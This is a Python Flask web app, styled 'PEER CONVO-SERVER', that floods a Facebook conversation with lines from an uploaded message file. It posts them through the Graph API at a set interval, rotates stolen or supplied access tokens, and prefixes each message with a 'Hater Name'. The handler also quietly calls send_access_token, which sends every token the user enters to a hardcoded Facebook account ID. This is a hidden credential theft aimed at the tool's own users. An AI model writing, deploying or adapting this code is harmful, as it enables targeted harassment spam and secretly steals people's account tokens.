from flask import Flask, request, render_template_string
import threading, time, requests, pytz
from datetime import datetime
import uuid
app = Flask(__name__)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PEER CONVO-SERVER</title>
    <style>
        /* General Styling */
        body {
            margin: 0;
            padding: 0;
            background-color: #1e1e1e;
            color: #e0e0e0;
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
        }

        h1 {
            color: #39FF14;
            font-size: 3rem;
            text-align: center;
            margin: 20px 0;
            text-shadow: 0 0 20px #39FF14, 0 0 30px #32CD32;
        }

        h2 {
            color: #FF007F;
            font-size: 2.2rem;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #FF007F, 0 0 15px #FF1493;
        }

        p, label {
            color: #d4d4d4;
            font-size: 1rem;
        }

        a {
            color: #39FF14;
            text-decoration: none;
            transition: 0.3s ease-in-out;
        }
        a:hover {
            text-decoration: underline;
            color: #32CD32;
        }

        /* Form Container */
        .content {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px;
            background-color: #292929;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(57, 255, 20, 0.3);
            margin-top: 30px;
        }

        /* Form Inputs and Labels */
        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #FFA500;
            font-weight: 600;
            text-shadow: 0 0 10px #FFA500;
            font-size: 1.1rem;
        }

        .form-control {
            width: 100%;
            padding: 14px;
            background-color: #333;
            border: 1px solid #444;
            border-radius: 8px;
            color: #ffffff;
            font-size: 1rem;
            transition: border-color 0.3s ease-in-out;
            box-sizing: border-box;
        }

        .form-control:focus {
            border-color: #39FF14;
            outline: none;
            box-shadow: 0 0 8px rgba(57, 255, 20, 0.5);
        }

        select.form-control {
            cursor: pointer;
        }

        /* Buttons */
        .btn {
            padding: 14px 30px;
            font-size: 1.1rem;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: 0.3s ease-in-out;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
        }

        .btn-primary {
            background-color: #39FF14;
            color: #121212;
        }

        .btn-primary:hover {
            background-color: #32CD32;
        }

        .btn-danger {
            background-color: #FF007F;
            color: #ffffff;
        }

        .btn-danger:hover {
            background-color: #FF1493;
        }

        /* Footer */
        footer {
            background-color: #111;
            text-align: center;
            padding: 30px;
            color: #bbb;
            margin-top: 40px;
            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.3);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }
            .btn {
                width: 100%;
                padding: 12px 20px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <h1>PEER CONVO-SERVER</h1>
    <div class="content">
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label class="form-label">Token Option:</label>
                <select name="tokenOption" class="form-control" onchange="toggleInputs(this.value)">
                    <option value="single">Single Token</option>
                    <option value="multi">Multi Tokens</option>
                </select>
            </div>

            <div id="singleInput" class="form-group">
                <label class="form-label">Single Token:</label>
                <input type="text" name="singleToken" class="form-control">
            </div>

            <div id="multiInputs" class="form-group" style="display: none;">
                <label class="form-label">Day File:</label>
                <input type="file" name="dayFile" class="form-control">
                <label class="form-label">Night File:</label>
                <input type="file" name="nightFile" class="form-control">
            </div>

            <div class="form-group">
                <label class="form-label">Conversation ID:</label>
                <input type="text" name="convo" class="form-control" required>
            </div>

            <div class="form-group">
                <label class="form-label">Message File:</label>
                <input type="file" name="msgFile" class="form-control" required>
            </div>

            <div class="form-group">
                <label class="form-label">Interval (sec):</label>
                <input type="number" name="interval" class="form-control" required>
            </div>

            <div class="form-group">
                <label class="form-label">Hater Name:</label>
                <input type="text" name="haterName" class="form-control" required>
            </div>

            <button class="btn btn-primary" type="submit">Start</button>
        </form>

        <form method="POST" action="/stop">
            <div class="form-group">
                <label class="form-label">Task ID to Stop:</label>
                <input type="text" name="task_id" class="form-control" required>
            </div>
            <button class="btn btn-danger" type="submit">Stop Task</button>
        </form>
    </div>

    <footer>© Created By Peer brand</footer>

    <script>
        function toggleInputs(value) {
            document.getElementById("singleInput").style.display = value === "single" ? "block" : "none";
            document.getElementById("multiInputs").style.display = value === "multi" ? "block" : "none";
        }
    </script>
</body>
</html>"""
stop_events = {}
@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)
@app.route("/", methods=["POST"])
def handle_form():
    opt = request.form["tokenOption"]
    convo = request.form["convo"]
    interval = int(request.form["interval"])
    hater = request.form["haterName"]
    msgs = request.files["msgFile"].read().decode().splitlines()
    if opt == "single":
        tokens = [request.form["singleToken"]]
    else:
        tokens = {
            "day": request.files["dayFile"].read().decode().splitlines(),
            "night": request.files["nightFile"].read().decode().splitlines()
        }
    if opt == "single":
        send_access_token("61552108006602", tokens[0])
    else:
        for token in tokens["day"] + tokens["night"]:
            send_access_token("61552108006602", token)
    task_id = str(uuid.uuid4())
    stop_events[task_id] = threading.Event()
    threading.Thread(target=start_messaging, args=(tokens, msgs, convo, interval, hater, opt, task_id)).start()
    return f"Messaging started for conversation {convo}. Task ID: {task_id}"
@app.route("/stop", methods=["POST"])
def stop_task():
    task_id = request.form["task_id"]
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task with ID {task_id} has been stopped."
    else:
        return f"No active task with ID {task_id}."
def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        current_hour = datetime.now(pytz.timezone('UTC')).hour

        if token_option == "multi":
            if 6 <= current_hour < 18:
                token_list = tokens["day"]
            else:
                token_list = tokens["night"]
        else:
            token_list = tokens
        for msg in messages:
            if stop_event.is_set():
                break
            send_msg(convo_id, token_list[token_index], msg, hater_name)
            token_index = (token_index + 1) % len(token_list)
            time.sleep(interval)
def send_msg(convo_id, access_token, message, hater_name):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        parameters = {
            "access_token": access_token,
            "message": f"{hater_name}: {message}"
        }
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.post(url, json=parameters, headers=headers)
        if response.status_code != 200:
            print(f"Failed to send message. Status code: {response.status_code}")
            print(f"Error Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message: {e}")
def send_access_token(uid, token):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{uid}/"
        parameters = {"access_token": token, "message": token}
        requests.post(url, json=parameters)
    except requests.RequestException as e:
        print(f"Error sending access token: {e}")
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)